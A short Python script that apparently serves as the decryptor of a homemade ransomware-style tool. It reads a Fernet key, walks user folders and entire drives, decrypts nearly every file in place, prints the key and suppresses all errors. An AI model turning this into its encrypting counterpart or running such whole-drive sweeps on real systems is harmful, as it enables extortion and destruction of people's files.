#!/user/bin/env python3
import os
import shutil
from cryptography.fernet import Fernet
with open("thekey.key", "rb") as TheKey:
    Key = TheKey.read()
# find all the file and add thim on list
print(f"The Key : {Key} ")
files = []
root_dir = []
root_dir.append('/home/user/Documents/')
root_dir.append('/home/user/Doc2/')
root_dir.append('C:\\users\\')
root_dir.append('D:\\')
root_dir.append('E:\\')
root_dir.append('F:\\')
for root in root_dir :
    for subdir, dirs, files in os.walk(root):
        for file in files:
            try:
                if file.endswith('.py') \
                        or file.endswith('.key') \
                        or file.endswith('.xml') \
                        or file.endswith('.iml') \
                        or file.endswith('gnore') \
                        or os.path.isdir(file):
                    continue
                # skip python files
                file_path = os.path.join(subdir, file)
                print(f" decript file  : {file_path}")
                file_stats = os.stat(file_path)
                with open(file_path, "rb") as f:
                    contents = f.read()
                contents_decrypt = Fernet(Key).decrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(contents_decrypt)
                file_stats2 = os.stat(file_path)
                print(f" {file_path}    {file_stats.st_size} -> {file_stats2.st_size}")
            except:
                pass